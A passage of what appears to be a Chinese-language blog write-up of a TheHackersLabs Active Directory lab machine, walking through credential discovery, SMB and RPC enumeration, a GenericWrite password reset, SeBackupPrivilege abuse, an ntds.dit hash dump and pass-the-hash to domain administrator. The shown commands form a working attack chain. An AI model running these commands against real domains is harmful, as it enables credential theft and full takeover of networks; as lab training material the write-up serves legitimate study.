+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  pdfgrep <span class="token parameter variable">-r</span> lucas <span class="token builtin class-name">.</span>                                                         <span class="token punctuation">[</span><span class="token number">12</span>:23:32<span class="token punctuation">]</span>
+./2023-01-12.pdf:   ●​ Nombre de usuario <span class="token punctuation">(</span>Usuario AD<span class="token punctuation">)</span>: lucas.miller@neptune.thl</code></pre>
+<p><img src="https://ooo.0x0.ooo/2025/03/27/OS92Q6.png" alt="OS92Q6.png" loading="lazy"><br>打开拿到密码<code>E@6q%TnR7UEQSXywr8^@</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  crackmapexec smb <span class="token number">192.168</span>.56.10 <span class="token parameter variable">-u</span> lucas.miller <span class="token parameter variable">-p</span> E@6q%TnR7UEQSXywr8^@     <span class="token punctuation">[</span><span class="token number">12</span>:25:00<span class="token punctuation">]</span>
+SMB         <span class="token number">192.168</span>.56.10   <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10.0</span> Build <span class="token number">20348</span> x64 <span class="token punctuation">(</span>name:DC01<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:neptune.thl<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:True<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
+SMB         <span class="token number">192.168</span>.56.10   <span class="token number">445</span>    DC01             <span class="token punctuation">[</span>+<span class="token punctuation">]</span> neptune.thl<span class="token punctuation">\</span>lucas.miller:E@6q%TnR7UEQSXywr8^@</code></pre>
+<h2 id="rpc信息收集-smb"><a href="#rpc信息收集-smb" class="headerlink" title="rpc信息收集+smb"></a>rpc信息收集+smb</h2><p>尝试winrm登录失败,尝试SMB查看</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  smbmap <span class="token parameter variable">-H</span> <span class="token number">192.168</span>.56.10 <span class="token parameter variable">-u</span> <span class="token string">"lucas.miller"</span> <span class="token parameter variable">-p</span> <span class="token string">"E@6q%TnR7UEQSXywr8^@"</span>                <span class="token punctuation">[</span><span class="token number">12</span>:33:41<span class="token punctuation">]</span>
+
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /<span class="token string">"       )|"</span>  <span class="token punctuation">\</span>    /<span class="token string">"  ||   _  "</span><span class="token punctuation">\</span> <span class="token operator">|</span><span class="token string">"  \    /"</span>  <span class="token operator">|</span>     /<span class="token string">""</span><span class="token punctuation">\</span>       <span class="token operator">|</span>   __ <span class="token string">"\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /"</span> <span class="token punctuation">\</span>   <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">||</span><span class="token builtin class-name">:</span> <span class="token operator">|</span>_<span class="token punctuation">)</span>  <span class="token builtin class-name">:</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">|</span> /   /  <span class="token punctuation">\</span>   <span class="token punctuation">\</span>  /<span class="token operator">|</span>__/ <span class="token punctuation">\</span>
+  <span class="token punctuation">(</span>_______/  <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>_______/ <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>___/    <span class="token punctuation">\</span>___<span class="token punctuation">)</span><span class="token punctuation">(</span>_______<span class="token punctuation">)</span>
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.4 <span class="token operator">|</span> Shawn Evans - ShawnDEvans@gmail.com<span class="token operator">&lt;</span>mailto:ShawnDEvans@gmail.com<span class="token operator">></span>
+                     https://github.com/ShawnDEvans/smbmap
+
+<span class="token punctuation">[</span><span class="token punctuation">\</span><span class="token punctuation">]</span> Checking <span class="token keyword">for</span> <span class="token function">open</span> ports<span class="token punctuation">..</span>.                                                                                  <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Detected <span class="token number">1</span> hosts serving SMB
+<span class="token punctuation">[</span><span class="token operator">|</span><span class="token punctuation">]</span> Authenticating<span class="token punctuation">..</span>.                                                                                           <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Established <span class="token number">1</span> SMB connections<span class="token punctuation">(</span>s<span class="token punctuation">)</span> and <span class="token number">1</span> authenticated session<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>/<span class="token punctuation">]</span> Enumerating shares<span class="token punctuation">..</span>.                                                                                       <span class="token punctuation">[</span>-<span class="token punctuation">]</span> Enumerating shares<span class="token punctuation">..</span>.                                                                                                                                                                                           
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: <span class="token number">192.168</span>.56.10:445       Name: neptune.thl               Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        E$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        IT                                                      NO ACCESS
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share </code></pre>
+<p>使用bloodhound收集域内信息</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  bloodhound-python <span class="token parameter variable">-u</span> Lucas.Miller <span class="token parameter variable">-p</span> E@6q%TnR7UEQSXywr8^@ <span class="token parameter variable">-d</span> neptune.thl  <span class="token parameter variable">-v</span>  <span class="token parameter variable">-ns</span> <span class="token number">192.168</span>.56.10 <span class="token parameter variable">-c</span> ALL</code></pre>
+<p>发现并没有从lucas的攻击路径<br><img src="https://ooo.0x0.ooo/2025/03/27/OS92Q6.png" alt="OS92Q6.png" loading="lazy"><br>rpc信息收集</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  rpcclient <span class="token parameter variable">-U</span> lucas.miller%<span class="token string">'E@6q%TnR7UEQSXywr8^@'</span> <span class="token number">192.168</span>.56.10  
+rpcclient $<span class="token operator">></span> enumdomusers
+user:<span class="token punctuation">[</span>Administrator<span class="token punctuation">]</span> rid:<span class="token punctuation">[</span>0x1f4<span class="token punctuation">]</span>
+user:<span class="token punctuation">[</span>Guest<span class="token punctuation">]</span> rid:<span class="token punctuation">[</span>0x1f5<span class="token punctuation">]</span>
+user:<span class="token punctuation">[</span>krbtgt<span class="token punctuation">]</span> rid:<span class="token punctuation">[</span>0x1f6<span class="token punctuation">]</span>
+user:<span class="token punctuation">[</span>lucas.miller<span class="token punctuation">]</span> rid:<span class="token punctuation">[</span>0x451<span class="token punctuation">]</span>
+user:<span class="token punctuation">[</span>victor.rodriguez<span class="token punctuation">]</span> rid:<span class="token punctuation">[</span>0x452<span class="token punctuation">]</span>
+user:<span class="token punctuation">[</span>emma.johnson<span class="token punctuation">]</span> rid:<span class="token punctuation">[</span>0x453<span class="token punctuation">]</span>
+user:<span class="token punctuation">[</span>thomas.brown<span class="token punctuation">]</span> rid:<span class="token punctuation">[</span>0x454<span class="token punctuation">]</span>
+rpcclient $<span class="token operator">></span> queryuser 0x452
+        User Name   <span class="token builtin class-name">:</span>   victor.rodriguez
+        Full Name   <span class="token builtin class-name">:</span>   Victor Rodriguez
+        Home Drive  <span class="token builtin class-name">:</span>
+        Dir Drive   <span class="token builtin class-name">:</span>
+        Profile Path:
+        Logon Script:
+        Description <span class="token builtin class-name">:</span>   My Password is H5gVCzzZkzJ<span class="token comment">#wGsT8u1$</span>
+        Workstations:
+        Comment     <span class="token builtin class-name">:</span>
+        Remote Dial <span class="token builtin class-name">:</span>
+        Logon Time               <span class="token builtin class-name">:</span>      四, 01 <span class="token number">1</span>月 <span class="token number">1970</span> 08:00:00 CST
+        Logoff Time              <span class="token builtin class-name">:</span>      四, 01 <span class="token number">1</span>月 <span class="token number">1970</span> 08:00:00 CST
+        Kickoff Time             <span class="token builtin class-name">:</span>      四, <span class="token number">14</span> <span class="token number">9</span>月 <span class="token number">30828</span> <span class="token number">10</span>:48:05 CST
+        Password last <span class="token builtin class-name">set</span> Time   <span class="token builtin class-name">:</span>      四, <span class="token number">27</span> <span class="token number">2</span>月 <span class="token number">2025</span> 06:42:14 CST
+        Password can change Time <span class="token builtin class-name">:</span>      五, <span class="token number">28</span> <span class="token number">2</span>月 <span class="token number">2025</span> 06:42:14 CST
+        Password must change Time:      四, <span class="token number">14</span> <span class="token number">9</span>月 <span class="token number">30828</span> <span class="token number">10</span>:48:05 CST
+        unknown_2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">..</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">..</span>.
+        user_rid <span class="token builtin class-name">:</span>      0x452
+        group_rid:      0x201
+        acb_info <span class="token builtin class-name">:</span>      0x00000210
+        fields_present: 0x00ffffff
+        logon_divs:     <span class="token number">168</span>
+        bad_password_count:     0x00000000
+        logon_count:    0x00000000
+        padding1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">..</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">..</span>.
+        logon_hrs<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">..</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">..</span>.</code></pre>
+<p>拿到Victor的密码<code>H5gVCzzZkzJ#wGsT8u1$</code><br><img src="https://ooo.0x0.ooo/2025/03/27/OS9CkB.png" alt="OS9CkB.png" loading="lazy"><br>Victor是IT组成员，所以可以smb查看IT目录</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  smbclient //192.168.56.10/IT <span class="token parameter variable">-U</span> victor.rodriguez                      
+
+Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>victor.rodriguez<span class="token punctuation">]</span>:
+Try <span class="token string">"help"</span> to get a list of possible commands.
+smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
+  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Thu Feb <span class="token number">27</span> 08:14:40 <span class="token number">2025</span>
+  <span class="token punctuation">..</span>                                DHS        <span class="token number">0</span>  Fri Feb <span class="token number">28</span> 03:52:00 <span class="token number">2025</span>
+  Scripts                             D        <span class="token number">0</span>  Thu Feb <span class="token number">27</span> 08:16:55 <span class="token number">2025</span>
+
+                <span class="token number">10540543</span> blocks of size <span class="token number">4096</span>. <span class="token number">7014173</span> blocks available
+smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token builtin class-name">cd</span> Scripts
+smb: <span class="token punctuation">\</span>Scripts<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
+  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Thu Feb <span class="token number">27</span> 08:16:55 <span class="token number">2025</span>
+  <span class="token punctuation">..</span>                                  D        <span class="token number">0</span>  Thu Feb <span class="token number">27</span> 08:14:40 <span class="token number">2025</span>
+  backup.ps1                          A     <span class="token number">1957</span>  Thu Feb <span class="token number">27</span> 08:20:11 <span class="token number">2025</span>
+
+                <span class="token number">10540543</span> blocks of size <span class="token number">4096</span>. <span class="token number">7014173</span> blocks available
+smb: <span class="token punctuation">\</span>Scripts<span class="token punctuation">\</span><span class="token operator">></span> get backup.ps1
+getting <span class="token function">file</span> <span class="token punctuation">\</span>Scripts<span class="token punctuation">\</span>backup.ps1 of size <span class="token number">1957</span> as backup.ps1 <span class="token punctuation">(</span><span class="token number">1910.9</span> KiloBytes/sec<span class="token punctuation">)</span> <span class="token punctuation">(</span>average <span class="token number">1911.1</span> KiloBytes/sec<span class="token punctuation">)</span>
+smb: <span class="token punctuation">\</span>Scripts<span class="token punctuation">\</span><span class="token operator">></span> <span class="token builtin class-name">exit</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> backup.ps1                                                             <span class="token punctuation">[</span><span class="token number">12</span>:59:01<span class="token punctuation">]</span>
+<span class="token variable">$sourceDirectory</span> <span class="token operator">=</span> <span class="token string">"C:\Confidenciales"</span>
+<span class="token variable">$destinationDirectory</span> <span class="token operator">=</span> <span class="token string">"E:\Backups\Confidenciales"</span>
+
+<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string">"emma.johnson"</span>
+<span class="token variable">$password</span> <span class="token operator">=</span> ConvertTo-SecureString <span class="token string">"sb9TVndq8N@tUVMmP2@#"</span> <span class="token parameter variable">-AsPlainText</span> <span class="token parameter variable">-Force</span>
+<span class="token variable">$credentials</span> <span class="token operator">=</span> New-Object System.Management.Automation.PSCredential<span class="token punctuation">(</span><span class="token variable">$username</span>, <span class="token variable">$password</span><span class="token punctuation">)</span>
+
+<span class="token variable">$emailFrom</span> <span class="token operator">=</span> <span class="token string">"emma.johnson@neptune.thl"</span>
+<span class="token variable">$emailTo</span> <span class="token operator">=</span> <span class="token string">"emma.johnson@neptune.thl"</span>
+<span class="token variable">$smtpServer</span> <span class="token operator">=</span> <span class="token string">"smtp.neptune.thl"</span>
+<span class="token variable">$smtpPort</span> <span class="token operator">=</span> <span class="token number">587</span>
+<span class="token variable">$emailSubject</span> <span class="token operator">=</span> <span class="token string">"Notificación de Backup Completo"</span>
+
+<span class="token variable">$dateStamp</span> <span class="token operator">=</span> Get-Date <span class="token parameter variable">-Format</span> <span class="token string">"yyyyMMdd_HHmmss"</span>
+<span class="token variable">$backupFileName</span> <span class="token operator">=</span> <span class="token string">"report_backup_<span class="token variable">$dateStamp</span>.zip"</span>
+<span class="token variable">$backupFilePath</span> <span class="token operator">=</span> Join-Path <span class="token parameter variable">-Path</span> <span class="token variable">$destinationDirectory</span> <span class="token parameter variable">-ChildPath</span> <span class="token variable">$backupFileName</span>
+
+<span class="token keyword">function</span> <span class="token function-name function">Send-EmailNotification</span> <span class="token punctuation">&#123;</span>
+    param <span class="token punctuation">(</span>
+        <span class="token punctuation">[</span>string<span class="token punctuation">]</span><span class="token variable">$subject</span>,
+        <span class="token punctuation">[</span>string<span class="token punctuation">]</span><span class="token variable">$body</span>
+    <span class="token punctuation">)</span>
+    try <span class="token punctuation">&#123;</span>
+        <span class="token variable">$smtpClient</span> <span class="token operator">=</span> New-Object System.Net.Mail.SmtpClient<span class="token punctuation">(</span><span class="token variable">$smtpServer</span>, <span class="token variable">$smtpPort</span><span class="token punctuation">)</span>
+        <span class="token variable">$smtpClient</span>.EnableSsl <span class="token operator">=</span> <span class="token variable">$true</span>
+        <span class="token variable">$smtpClient</span>.Credentials <span class="token operator">=</span> New-Object System.Net.NetworkCredential<span class="token punctuation">(</span><span class="token string">"smtp_user"</span>, <span class="token string">"smtp_password"</span><span class="token punctuation">)</span>
+
+        <span class="token variable">$mailMessage</span> <span class="token operator">=</span> New-Object System.Net.Mail.MailMessage<span class="token punctuation">(</span><span class="token variable">$emailFrom</span>, <span class="token variable">$emailTo</span>, <span class="token variable">$subject</span>, <span class="token variable">$body</span><span class="token punctuation">)</span>
+        <span class="token variable">$smtpClient</span>.Send<span class="token punctuation">(</span><span class="token variable">$mailMessage</span><span class="token punctuation">)</span>
+        Write-Host <span class="token string">"Correo enviado a <span class="token variable">$emailTo</span>"</span>
+    <span class="token punctuation">&#125;</span>
+    catch <span class="token punctuation">&#123;</span>
+        Write-Host <span class="token string">"Error al enviar el correo: <span class="token variable">$_</span>"</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+try <span class="token punctuation">&#123;</span>
+    Write-Host <span class="token string">"Iniciando el backup..."</span>
+    Compress-Archive <span class="token parameter variable">-Path</span> <span class="token variable">$sourceDirectory</span> <span class="token parameter variable">-DestinationPath</span> <span class="token variable">$backupFilePath</span>
+    Write-Host <span class="token string">"Backup completado exitosamente. Archivo guardado en: <span class="token variable">$backupFilePath</span>"</span>
+
+    <span class="token variable">$emailBody</span> <span class="token operator">=</span> <span class="token string">"El proceso de backup se ha completado correctamente."</span> + <span class="token string">"<span class="token variable"><span class="token variable">`</span>n<span class="token string">" + "</span>Archivo de backup: $backupFilePath<span class="token string">"
+
+    Send-EmailNotification -subject <span class="token variable">$emailSubject</span> -body <span class="token variable">$emailBody</span>
+&#125;
+catch &#123;
+    Write-Host "</span>Error al realizar el backup: $_<span class="token string">"
+
+    <span class="token variable">$errorSubject</span> = "</span>Error en el proceso de Backup<span class="token string">"
+    <span class="token variable">$errorBody</span> = "</span>Hubo un problema al realizar el backup.<span class="token string">" + "</span><span class="token variable">`</span></span>n"</span> + <span class="token string">"Error: <span class="token variable">$_</span>"</span>
+    Send-EmailNotification <span class="token parameter variable">-subject</span> <span class="token variable">$errorSubject</span> <span class="token parameter variable">-body</span> <span class="token variable">$errorBody</span>
+<span class="token punctuation">&#125;</span><span class="token comment">#                                                    </span></code></pre>
+<p>泄露了emma.johnson的密码<code>sb9TVndq8N@tUVMmP2@#</code><br><img src="https://ooo.0x0.ooo/2025/03/27/OSja5a.png" alt="OSja5a.png" loading="lazy"><br>emma可以远程登录</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp/pdfs<span class="token punctuation">]</span> ➜  evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.56.10 <span class="token parameter variable">-u</span> <span class="token string">"emma.johnson"</span> <span class="token parameter variable">-p</span> sb9TVndq8N@tUVMmP2@<span class="token comment">#      [12:59:44]</span>
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
+                                        
+Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Emma Johnson<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/Desktop
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Emma Johnson<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token function">ls</span>
+
+
+    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Emma Johnson<span class="token punctuation">\</span>Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         <span class="token number">2</span>/26/2025   <span class="token number">8</span>:51 PM             <span class="token number">32</span> user.txt
+
+
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Emma Johnson<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token builtin class-name">type</span> user.txt
+a5accd70ea911b92487cea1d1cb73162</code></pre>
+<h2 id="genericWrite"><a href="#genericWrite" class="headerlink" title="genericWrite"></a>genericWrite</h2><p>其实这里靶机bug了，需要重新导入一次，发现emma对thomas有genericWreite权限，直接修改一下thomas密码<br><img src="https://ooo.0x0.ooo/2025/03/27/OSjoAS.png" alt="OSjoAS.png" loading="lazy"></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  rpcclient <span class="token parameter variable">-U</span> emma.johnson%<span class="token string">'sb9TVndq8N@tUVMmP2@#'</span> <span class="token number">192.168</span>.56.10
+rpcclient $<span class="token operator">></span> setuserinfo2 thomas.brown <span class="token number">24</span> Passw0rd<span class="token operator">!</span></code></pre>
+<h2 id="卷影拷贝"><a href="#卷影拷贝" class="headerlink" title="卷影拷贝"></a>卷影拷贝</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.56.10 <span class="token parameter variable">-u</span> <span class="token string">"thomas.brown"</span> <span class="token parameter variable">-p</span> Passw0rd<span class="token operator">!</span>                      <span class="token punctuation">[</span><span class="token number">13</span>:22:40<span class="token punctuation">]</span>
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
+                                        
+Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>thomas.brown<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="token builtin class-name">set</span> Enabled</code></pre>
+<p>Thomas有<code>SeBackupPrivilege</code>权限，卷影拷贝提权，直接把之前做过的指令输一遍即可<br><a href="https://tao0845.github.io/posts/cb0f9c73/?highlight=sebackupprivilege">https://tao0845.github.io/posts/cb0f9c73/?highlight=sebackupprivilege</a></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  secretsdump.py  <span class="token parameter variable">-ntds</span> ntds.dit <span class="token parameter variable">-system</span> system <span class="token builtin class-name">local</span>                             <span class="token punctuation">[</span><span class="token number">13</span>:42:29<span class="token punctuation">]</span>
+Impacket v0.9.24 - Copyright <span class="token number">2021</span> SecureAuth Corporation
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Target system bootKey: 0x9a6eda47674d4ed68313ddc1c8f9ca5b
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping Domain Credentials <span class="token punctuation">(</span>domain<span class="token punctuation">\</span>uid:rid:lmhash:nthash<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Searching <span class="token keyword">for</span> pekList, be patient
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> PEK <span class="token comment"># 0 found and decrypted: 5e8a0e9e33e9b3e49f0767e39f3e7d29</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3a79fceda1024c1344c493c1f6e4c6c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1001:aad3b435b51404eeaad3b435b51404ee:0e0e9e9b2d198f0988bb046450ae8197:::</code></pre>
+<p>拿到域管hash <code>3a79fceda1024c1344c493c1f6e4c6c0</code></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.56.10 <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-H</span> 3a79fceda1024c1344c493c1f6e4c6c0
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
+                                        
+Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span>
+neptune<span class="token punctuation">\</span>administrator
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/Desktop
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token function">dir</span>
+
+
+    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         <span class="token number">2</span>/26/2025   <span class="token number">8</span>:52 PM             <span class="token number">32</span> root.txt
+
+
+*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token operator">></span> <span class="token builtin class-name">type</span> root.txt
+cb067ebf9847990f92f49c0612ef56b6</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/92742d47/" title="thehackerslabs-BLACKGOD">https://tao0845.github.io/posts/92742d47/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/f8a60ebc/" rel="next" title="春秋云境-GreatWall"><span class="post-nav-text">春秋云境-GreatWall</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
